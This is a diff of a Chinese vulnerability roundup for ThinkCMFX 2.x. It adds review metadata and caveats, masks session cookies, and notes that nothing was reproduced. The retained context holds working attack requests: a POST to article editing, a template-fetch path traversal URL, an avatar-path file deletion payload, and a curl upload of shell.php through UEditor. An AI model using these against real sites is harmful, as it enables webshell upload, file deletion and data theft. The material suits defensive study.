@@ -1,6 +1,40 @@
 ---
 source: "白阁文库 BaizeSec/bylibrary"
+product: "ThinkCMFX2.x incl2.2.3"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+title: "ThinkCMF漏洞全集和"
+prerequisites: "来源所述条件，未列明部分仍待核：SQLi/UEditor上传需会员；头像删除Windows；public模板方法测试Windows，模板存在"
+side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
+source_status: "unknown"
+id: "vw-eede6b2d3f843a36ad4b05c2"
+entity_id: "ve-eede6b2d3f843a36ad4b05c2"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：SQLi/UEditor上传需会员；头像删除Windows；public模板方法测试Windows，模板存在
+
+- **证据待核（1）**：和416大量同源，但补SQLi登录、正确imgurl及原始多来源值得整合。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。
+
+- **结论使用边界（2）**：所谓四处模板注入中3/4是同fetch不同参数形式，不能按四独立漏洞计数。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
+
+- **事实待核（3）**：颜色/logo识别3版即可漏洞是无证泛化；正文各漏洞版本未分别限定。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。
+
+- **适用与权限边界（4）**：README读取示例不能单独证明数据库配置读取/任意路径；第四原生PHP串缺闭合但视payload可能EOF合法，应按原环境核验。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 ## ThinkCMF漏洞全集和  
 > ...持续收集,欢迎贡献  
@@ -13,7 +47,7 @@ source: "白阁文库 BaizeSec/bylibrary"
 POST /ThinkCMFX/index.php?g=portal&m=article&a=edit_post HTTP/1.1
 Host: localhost
 Connection: close
-Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95
+Cookie: PHPSESSID=kcg********************j95
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 79
 
@@ -52,7 +86,7 @@ http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templateFile=/../../..
 ```
 POST /ThinkCMFX/index.php?g=User&m=Profile&a=do_avatar& HTTP/1.1
 Host: localhost
-Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0;
+Cookie: PHPSESSID=bgg********************mq0;
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 27
@@ -62,7 +96,7 @@ imgurl=..\..\..\test.txt
 
 - 任意文件上传  
 > 在 ThinkCMFX2.2.3 最终版中，存在一处任意文件上传（需要普通用户权限，默认可注册）  
-` curl -F "file=@/tmp/shell.php" -X "POST" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' 'http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile'
+` curl -F "file=@/tmp/shell.php" -X "POST" -b 'PHPSESSID=qek********************kd0;' 'http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile'
 `
 
 - 任意文件包含（读取数据库配置等等）  
